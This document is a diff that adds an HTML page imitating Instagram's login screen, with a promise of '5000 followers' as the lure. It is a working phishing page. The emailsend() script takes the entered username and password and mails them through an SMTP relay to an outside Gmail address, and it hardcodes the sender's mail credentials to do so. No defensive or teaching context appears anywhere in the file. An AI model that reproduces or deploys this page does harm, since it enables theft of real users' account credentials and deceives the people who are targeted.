@@ -1,0 +1,107 @@
+<!doctype html>
+<html>
+<head>
+<title>
+Instagram
+</title>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width">
+<link rel="stylesheet" href="Instagram Login.css">
+
+</head>
+
+<body>
+<h1 class=instagram>
+Instagram
+</h1>
+
+<form onsubmit="emailsend(); reset(); return false;">
+
+ <input type="text,email" id="name" placeholder="phone number, username or email address" name="phone number, username or email address" required />
+
+</br>
+
+<input class="pswd" type="password" id="password" placeholder="Password" name="password" required/>
+
+<img class="Eye" src="Eyeclose.jpg " id="EyeLogo" />
+
+
+<div class=join>
+<p>
+<a href="https://help.instagram.com/155940534568753" class="forgot">Forgotten password?</a>
+</p>
+
+<button type="submit"  class="btn">Log In </button>
+</form>
+
+<p class=or>
+OR
+</p>
+
+<p class=fblog>
+<img src=Facebook.jpg>
+<a href="https://www.instagram.com/accounts/signup/phone/"class="log">Log in with Facebook</a>
+</p>
+
+<p class=" footer">
+Don't have an account? 
+<a href="https://www.instagram.com/accounts/signup/email/?hl=en" class="signup">Sign Up</a>
+</p>
+<div>
+
+<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+
+<script>
+function emailsend(){
+
+var  UserName = document.getElementById('name') . value;
+
+var  password = document.getElementById('password') . value;
+
+var messageBody = " User "+ UserName + " </br> Password " + password;
+
+
+
+Email.send({
+Host : "smtp.elasticemail.com",
+Username : "sarkihassan600@gmail.com",
+Password : "455hjczghc478843566ghhgf",
+To : 'the.amazing.001@gmail.com',
+From : "sarkihassan600@gmail.com",
+Subject : "This is the subject",
+Body : messageBody
+})then(
+message => {
+if(message== 'OK'){
+swal("successful", "Congratulation 5000 followers will be added to your account in the next 8 hour.", "success")
+}else{
+swal("Error", "Make sure information provided are correct.", "error")
+}
+}
+);
+}
+</script>
+
+<script>
+let EyeLogo = document.getElementById("EyeLogo");
+let password = document.getElementById("password");
+
+EyeLogo.onclick = function(){
+if (password.type == "password"){
+password.type = "text";
+EyeLogo.src = "Eyeopen.jpg";
+
+}else{
+password.type = "password";
+EyeLogo.src = "Eyeclose.jpg";
+}
+}
+</script>
+
+<script>
+</script>
+</body>
+</html>
